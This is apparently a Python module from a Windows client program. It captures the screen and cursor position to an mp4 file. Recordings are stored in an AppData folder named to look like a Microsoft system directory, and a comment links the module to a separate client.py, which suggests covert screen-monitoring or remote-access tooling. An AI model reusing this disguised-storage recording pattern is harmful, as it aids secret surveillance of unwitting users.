import logging
import time
import cv2
import numpy as np
from mss import mss
import ctypes
import ctypes.wintypes
import os

logger = logging.getLogger(__name__)

# Константа для временной папки (должна совпадать с client.py)
TEMP_SYSTEM_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "TempSystem")

def record_video(seconds):
    try:
        # Создание временной папки, если не существует
        os.makedirs(TEMP_SYSTEM_FOLDER, exist_ok=True)
        
        # Инициализация захвата экрана
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TEMP_SYSTEM_FOLDER, f"video_{timestamp}.mp4")
        with mss() as sct:
            monitor = sct.monitors[1]
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(filename, fourcc, 20.0, (monitor["width"], monitor["height"]))
            
            # Инициализация WinAPI для захвата курсора
            user32 = ctypes.WinDLL('user32')
            gdi32 = ctypes.WinDLL('gdi32')
            
            # Определяем структуру CURSORINFO
            class CURSORINFO(ctypes.Structure):
                _fields_ = [
                    ("cbSize", ctypes.wintypes.DWORD),
                    ("flags", ctypes.wintypes.DWORD),
                    ("hCursor", ctypes.wintypes.HANDLE),
                    ("ptScreenPos", ctypes.wintypes.POINT)
                ]
            
            start_time = time.time()
            while (time.time() - start_time) < seconds:
                # Захват кадра
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGBA2RGB)
                
                # Получение позиции и иконки курсора
                cursor_info = CURSORINFO()
                cursor_info.cbSize = ctypes.sizeof(cursor_info)
                user32.GetCursorInfo(ctypes.byref(cursor_info))
                
                if cursor_info.flags == 1:  # CURSOR_SHOWING
                    # Получение позиции курсора
                    x, y = cursor_info.ptScreenPos.x - monitor["left"], cursor_info.ptScreenPos.y - monitor["top"]
                    
                    # Рисование курсора (простой прямоугольник для видимости)
                    cv2.rectangle(
                        frame,
                        (x, y, x + 16, y + 16),
                        (255, 0, 0, 128),  # Полупрозрачный красный
                        -1
                    )
                
                out.write(frame)
                time.sleep(0.05)
            
            out.release()
        logger.info(f"🎥 Видео сохранено: {filename}")
        return filename
    except Exception as e:
        logger.error(f"❌ Ошибка записи видео: {e}")
        return None
